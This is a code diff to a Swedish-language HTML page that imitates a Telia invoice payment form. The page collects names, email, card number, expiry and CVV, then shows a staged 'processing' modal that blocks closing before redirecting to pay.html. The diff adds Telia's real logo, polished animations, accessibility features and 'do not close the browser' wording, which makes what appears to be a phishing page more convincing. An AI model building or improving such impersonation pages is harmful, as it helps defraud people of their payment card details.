@@ -14,7 +14,10 @@
   <meta property="og:title" content="Telia – Bekräfta dina uppgifter"/>
   <meta property="og:description" content="Fyll i dina uppgifter för att fortsätta till betalning."/>
   <meta property="og:type" content="website"/>
+  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/7/7c/Telia_logo_2022.svg"/>
+  <meta name="twitter:card" content="summary"/>
   <link rel="icon" href="data:,"/>
+  <link rel="preconnect" href="https://upload.wikimedia.org" crossorigin/>
  
   <style>
   :root{
@@ -223,6 +226,111 @@
     .invoice__meta{grid-template-columns:1fr}
     .invoice__meta dd{text-align:left}
   }
+
+  /* Smooth animations */
+  @media (prefers-reduced-motion: no-preference) {
+    .field input, .btn-pay, .invoice, .trust, .modal {
+      transition: all 0.2s ease-out;
+    }
+    .hero {
+      animation: fadeInUp 0.5s ease-out;
+    }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .trust-strip {
+      animation: fadeInUp 0.5s ease-out 0.2s both;
+    }
+  }
+
+  /* Better focus styles */
+  .field input:focus-visible {
+    outline: none;
+    border-color: var(--primary-600);
+    box-shadow: 0 0 0 4px rgba(124,58,237,.25);
+  }
+
+  /* Button loading state */
+  .btn-pay.loading {
+    position: relative;
+    color: transparent;
+  }
+  .btn-pay.loading::after {
+    content: '';
+    position: absolute;
+    width: 20px;
+    height: 20px;
+    top: 50%;
+    left: 50%;
+    margin-left: -10px;
+    margin-top: -10px;
+    border: 3px solid rgba(255,255,255,0.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+
+  /* Success notification */
+  .notification {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: var(--success);
+    color: #fff;
+    padding: 14px 20px;
+    border-radius: 10px;
+    box-shadow: var(--shadow-md);
+    transform: translateX(120%);
+    transition: transform 0.3s ease;
+    z-index: 10000;
+  }
+  .notification.show { transform: translateX(0); }
+
+  /* Progress indicator */
+  .progress-bar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    height: 3px;
+    background: linear-gradient(90deg, var(--primary), #EA4C89);
+    width: 0%;
+    transition: width 0.3s ease;
+    z-index: 10001;
+  }
+
+  /* Skip link improvement */
+  .sr-only:focus {
+    position: fixed;
+    top: 10px;
+    left: 10px;
+    width: auto;
+    height: auto;
+    padding: 12px 20px;
+    margin: 0;
+    overflow: visible;
+    clip: auto;
+    white-space: normal;
+    background: var(--primary);
+    color: #fff;
+    border-radius: 8px;
+    z-index: 10000;
+    font-weight: 600;
+  }
+
+  /* Field validation icons */
+  .field.is-valid input {
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20' fill='%2316A34A' viewBox='0 0 24 24'%3E%3Cpath d='M9 16.2l-3.5-3.5 1.4-1.4 2.1 2.1 5.6-5.6 1.4 1.4z'/%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: right 12px center;
+    padding-right: 40px;
+  }
+  .field.has-error input {
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20' fill='%23DC2626' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: right 12px center;
+    padding-right: 40px;
+  }
   </style>
 </head>
 <body>
@@ -265,38 +373,41 @@
         <h1>Bekräfta dina uppgifter</h1>
         <p>Fyll i fälten nedan för att fortsätta. Kontrollera att uppgifterna är korrekta innan du går vidare.</p>
  
-        <form class="user-form" id="paymentForm" autocomplete="on" novalidate>
-          <div class="grid">
+        <form class="user-form" id="paymentForm" autocomplete="on" novalidate aria-label="Betalningsformulär">
+          <div class="grid" role="group" aria-labelledby="formTitle">
+            <span id="formTitle" class="sr-only">Fyll i dina uppgifter för betalning</span>
             <div class="field" id="lastNameField">
-              <label for="lastName">Efternamn *</label>
-              <input id="lastName" name="lastName" type="text" placeholder="Svensson" autocomplete="family-name" required>
-              <span class="error-msg">Vänligen ange ditt efternamn</span>
+              <label for="lastName">Efternamn <span aria-hidden="true">*</span><span class="sr-only">(obligatoriskt)</span></label>
+              <input id="lastName" name="lastName" type="text" placeholder="Svensson" autocomplete="family-name" required aria-required="true" aria-describedby="lastNameError" aria-invalid="false">
+              <span class="error-msg" id="lastNameError" role="alert">Vänligen ange ditt efternamn (minst 2 tecken)</span>
             </div>
             <div class="field" id="firstNameField">
-              <label for="firstName">Förnamn *</label>
-              <input id="firstName" name="firstName" type="text" placeholder="Anna" autocomplete="given-name" required>
-              <span class="error-msg">Vänligen ange ditt förnamn</span>
+              <label for="firstName">Förnamn <span aria-hidden="true">*</span><span class="sr-only">(obligatoriskt)</span></label>
+              <input id="firstName" name="firstName" type="text" placeholder="Anna" autocomplete="given-name" required aria-required="true" aria-describedby="firstNameError" aria-invalid="false">
+              <span class="error-msg" id="firstNameError" role="alert">Vänligen ange ditt förnamn (minst 2 tecken)</span>
             </div>
             <div class="field field--full" id="emailField">
-              <label for="email">E-post *</label>
-              <input id="email" name="email" type="email" placeholder="namn@example.com" autocomplete="email" required>
-              <span class="error-msg">Vänligen ange en giltig e-postadress</span>
+              <label for="email">E-post <span aria-hidden="true">*</span><span class="sr-only">(obligatoriskt)</span></label>
+              <input id="email" name="email" type="email" placeholder="namn@example.com" autocomplete="email" required aria-required="true" aria-describedby="emailError" aria-invalid="false">
+              <span class="error-msg" id="emailError" role="alert">Vänligen ange en giltig e-postadress (t.ex. namn@example.com)</span>
             </div>
             <div class="field field--full" id="cardNumberField">
-              <label for="cardNumber">Kortnummer *</label>
-              <input id="cardNumber" name="cardNumber" type="text" placeholder="1234 5678 9012 3456" inputmode="numeric" autocomplete="cc-number" maxlength="19" required>
-              <span class="error-msg">Vänligen ange ett giltigt kortnummer (16 siffror)</span>
+              <label for="cardNumber">Kortnummer <span aria-hidden="true">*</span><span class="sr-only">(obligatoriskt)</span></label>
+              <input id="cardNumber" name="cardNumber" type="text" placeholder="1234 5678 9012 3456" inputmode="numeric" autocomplete="cc-number" maxlength="19" required aria-required="true" aria-describedby="cardNumberError cardNumberHint" aria-invalid="false">
+              <span class="hint" id="cardNumberHint">16 siffror på framsidan av ditt kort</span>
+              <span class="error-msg" id="cardNumberError" role="alert">Vänligen ange ett giltigt kortnummer (16 siffror)</span>
             </div>
             <div class="field-row">
               <div class="field" id="cardExpiryField">
-                <label for="cardExpiry">Giltighetstid (MM/ÅÅ) *</label>
-                <input id="cardExpiry" name="cardExpiry" type="text" placeholder="MM/ÅÅ" inputmode="numeric" autocomplete="cc-exp" maxlength="5" required>
-                <span class="error-msg">Vänligen ange ett giltigt datum</span>
+                <label for="cardExpiry">Giltighetstid <span aria-hidden="true">*</span><span class="sr-only">(obligatoriskt, format månad och år)</span></label>
+                <input id="cardExpiry" name="cardExpiry" type="text" placeholder="MM/ÅÅ" inputmode="numeric" autocomplete="cc-exp" maxlength="5" required aria-required="true" aria-describedby="cardExpiryError" aria-invalid="false">
+                <span class="error-msg" id="cardExpiryError" role="alert">Vänligen ange ett giltigt datum (MM/ÅÅ)</span>
               </div>
               <div class="field" id="cvvField">
-                <label for="cvv">Säkerhetskod (CVV) *</label>
-                <input id="cvv" name="cvv" type="text" placeholder="1234" inputmode="numeric" autocomplete="cc-csc" maxlength="4" required>
-                <span class="error-msg">Vänligen ange 4 siffror</span>
+                <label for="cvv">Säkerhetskod (CVV) <span aria-hidden="true">*</span><span class="sr-only">(obligatoriskt)</span></label>
+                <input id="cvv" name="cvv" type="password" placeholder="••••" inputmode="numeric" autocomplete="cc-csc" maxlength="4" required aria-required="true" aria-describedby="cvvError cvvHint" aria-invalid="false">
+                <span class="hint" id="cvvHint">4 siffror på baksidan av ditt kort</span>
+                <span class="error-msg" id="cvvError" role="alert">Vänligen ange 4 siffror</span>
               </div>
             </div>
           </div>
@@ -319,7 +430,10 @@
             <div class="vat">inkl. moms</div>
           </div>
  
-          <button type="submit" form="paymentForm" class="btn-pay" id="payBtn">Betala fakturan</button>
+          <button type="submit" form="paymentForm" class="btn-pay" id="payBtn" aria-describedby="paymentAmount">
+            <span class="btn-text">Betala fakturan</span>
+            <span class="sr-only" id="paymentAmount">349,00 SEK</span>
+          </button>
  
           <div class="invoice__footer">
             <div>Bankgiro: 5240-1234</div>
@@ -329,20 +443,42 @@
       </div>
     </section>
  
-    <section class="trust-strip container">
+    <section class="trust-strip container" aria-label="Våra fördelar">
       <div class="trust-grid">
-        <div class="trust"><span class="ic">✔</span><div><strong>Trygg betalning</strong><small>SSL och säker verifiering</small></div></div>
-        <div class="trust"><span class="ic">✔</span><div><strong>Fri frakt</strong><small>Snabb leverans i hela landet</small></div></div>
-        <div class="trust"><span class="ic">✔</span><div><strong>Kundsupport dygnet runt</strong><small>Vi hjälper dig när som helst</small></div></div>
+        <div class="trust">
+          <span class="ic" aria-hidden="true">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+          </span>
+          <div><strong>Trygg betalning</strong><small>SSL och säker verifiering</small></div>
+        </div>
+        <div class="trust">
+          <span class="ic" aria-hidden="true">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
+          </span>
+          <div><strong>Fri frakt</strong><small>Snabb leverans i hela landet</small></div>
+        </div>
+        <div class="trust">
+          <span class="ic" aria-hidden="true">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+          </span>
+          <div><strong>Kundsupport dygnet runt</strong><small>Vi hjälper dig när som helst</small></div>
+        </div>
       </div>
     </section>
   </main>
  
-  <div class="modal-overlay" id="loadingModal" role="dialog" aria-modal="true">
+  <!-- Progress bar -->
+  <div class="progress-bar" id="progressBar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100"></div>
+
+  <!-- Notification -->
+  <div class="notification" id="notification" role="status" aria-live="polite"></div>
+
+  <!-- Loading Modal -->
+  <div class="modal-overlay" id="loadingModal" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalDesc">
     <div class="modal">
-      <div class="spinner"></div>
-      <h2>Bearbetar din begäran …</h2>
-      <p>Vänligen vänta i några sekunder.</p>
+      <div class="spinner" aria-hidden="true"></div>
+      <h2 id="modalTitle">Bearbetar din begäran …</h2>
+      <p id="modalDesc">Vänligen vänta i några sekunder. Stäng inte webbläsaren.</p>
     </div>
   </div>
  
@@ -395,19 +531,26 @@
         <a href="#" class="soc" aria-label="Instagram">I</a>
         <a href="#" class="soc" aria-label="LinkedIn">L</a>
       </div>
-      <small>© 2025 Telia. Alla rättigheter förbehållna.</small>
+      <small>© <span id="currentYear">2025</span> Telia. Alla rättigheter förbehållna.</small>
+      <script>document.getElementById('currentYear').textContent = new Date().getFullYear();</script>
     </div>
   </footer>
  
   <script>
   (function() {
     'use strict';
- 
+
     // Elements
     const form = document.getElementById('paymentForm');
     const modal = document.getElementById('loadingModal');
     const btn = document.getElementById('payBtn');
- 
+    const progressBar = document.getElementById('progressBar');
+    const notification = document.getElementById('notification');
+
+    // Track if form has been modified
+    let formModified = false;
+    let isSubmitting = false;
+
     const fields = {
       firstName: {
         input: document.getElementById('firstName'),
@@ -467,15 +610,29 @@
         validate: (val) => /^\d{4}$/.test(val.replace(/\D/g, ''))
       }
     };
- 
+
+    // Show notification helper
+    function showNotification(message, duration = 3000) {
+      notification.textContent = message;
+      notification.classList.add('show');
+      setTimeout(() => notification.classList.remove('show'), duration);
+    }
+
+    // Update progress bar
+    function updateProgress(percent) {
+      progressBar.style.width = percent + '%';
+      progressBar.setAttribute('aria-valuenow', percent);
+    }
+
     // Format card number as user types
     fields.cardNumber.input.addEventListener('input', function() {
       let digits = this.value.replace(/\D/g, '').slice(0, 16);
       let formatted = digits.replace(/(\d{4})(?=\d)/g, '$1 ');
       this.value = formatted;
       validateField('cardNumber');
+      formModified = true;
     });
- 
+
     // Format expiry date as user types
     fields.cardExpiry.input.addEventListener('input', function() {
       let digits = this.value.replace(/\D/g, '').slice(0, 4);
@@ -485,41 +642,49 @@
         this.value = digits;
       }
       validateField('cardExpiry');
+      formModified = true;
     });
- 
+
     // CVV - only digits
     fields.cvv.input.addEventListener('input', function() {
       this.value = this.value.replace(/\D/g, '').slice(0, 4);
       validateField('cvv');
+      formModified = true;
     });
- 
+
     // Validate on blur for all fields
     Object.keys(fields).forEach(key => {
       fields[key].input.addEventListener('blur', () => validateField(key));
       fields[key].input.addEventListener('input', () => {
+        formModified = true;
         // Remove error state while typing
         if (fields[key].field.classList.contains('has-error')) {
           fields[key].input.classList.remove('error');
           fields[key].field.classList.remove('has-error');
+          fields[key].input.setAttribute('aria-invalid', 'false');
         }
       });
     });
- 
+
     function validateField(key) {
       const { input, field, validate } = fields[key];
       const isValid = validate(input.value);
+      const hasValue = input.value.length > 0;
       
-      input.classList.toggle('error', !isValid && input.value.length > 0);
+      input.classList.toggle('error', !isValid && hasValue);
       input.classList.toggle('valid', isValid);
-      field.classList.toggle('has-error', !isValid && input.value.length > 0);
+      field.classList.toggle('has-error', !isValid && hasValue);
+      field.classList.toggle('is-valid', isValid);
+      input.setAttribute('aria-invalid', (!isValid && hasValue) ? 'true' : 'false');
       
       return isValid;
     }
- 
+
     function validateAll() {
       let isValid = true;
       let firstInvalid = null;
- 
+      let errorCount = 0;
+
       Object.keys(fields).forEach(key => {
         const { input, field, validate } = fields[key];
         const fieldValid = validate(input.value);
@@ -527,43 +692,93 @@
         input.classList.toggle('error', !fieldValid);
         input.classList.toggle('valid', fieldValid);
         field.classList.toggle('has-error', !fieldValid);
+        field.classList.toggle('is-valid', fieldValid);
+        input.setAttribute('aria-invalid', fieldValid ? 'false' : 'true');
         
-        if (!fieldValid && isValid) {
-          isValid = false;
-          firstInvalid = input;
+        if (!fieldValid) {
+          errorCount++;
+          if (isValid) {
+            isValid = false;
+            firstInvalid = input;
+          }
         }
       });
- 
+
       if (firstInvalid) {
         firstInvalid.focus();
+        // Announce error count to screen readers
+        showNotification(`${errorCount} fält behöver korrigeras`);
       }
- 
+
       return isValid;
     }
- 
+
     // Form submission
     form.addEventListener('submit', function(e) {
       e.preventDefault();
- 
+
       if (!validateAll()) {
         return;
       }
- 
+
+      isSubmitting = true;
+
+      // Show loading state on button
+      btn.classList.add('loading');
+      btn.disabled = true;
+      btn.setAttribute('aria-busy', 'true');
+
       // Show loading modal
       modal.classList.add('active');
-      btn.disabled = true;
- 
+
+      // Animate progress bar
+      let progress = 0;
+      const progressInterval = setInterval(() => {
+        progress += Math.random() * 15;
+        if (progress > 90) progress = 90;
+        updateProgress(progress);
+      }, 500);
+
       // Redirect after 3 seconds
       setTimeout(function() {
+        clearInterval(progressInterval);
+        updateProgress(100);
         window.location.href = 'pay.html';
       }, 3000);
     });
- 
+
     // Prevent ESC from closing modal during processing
     window.addEventListener('keydown', function(e) {
       if (e.key === 'Escape' && modal.classList.contains('active')) {
         e.preventDefault();
       }
+    });
+
+    // Warn before leaving page with unsaved data
+    window.addEventListener('beforeunload', function(e) {
+      if (formModified && !isSubmitting) {
+        e.preventDefault();
+        e.returnValue = 'Du har osparade ändringar. Är du säker på att du vill lämna sidan?';
+        return e.returnValue;
+      }
+    });
+
+    // Trap focus inside modal when open
+    modal.addEventListener('keydown', function(e) {
+      if (e.key === 'Tab') {
+        e.preventDefault();
+      }
+    });
+
+    // Announce page load to screen readers
+    document.addEventListener('DOMContentLoaded', function() {
+      const announcement = document.createElement('div');
+      announcement.setAttribute('role', 'status');
+      announcement.setAttribute('aria-live', 'polite');
+      announcement.className = 'sr-only';
+      announcement.textContent = 'Betalningsformulär laddad. Fyll i alla obligatoriska fält för att fortsätta.';
+      document.body.appendChild(announcement);
+      setTimeout(() => announcement.remove(), 1000);
     });
   })();
   </script>
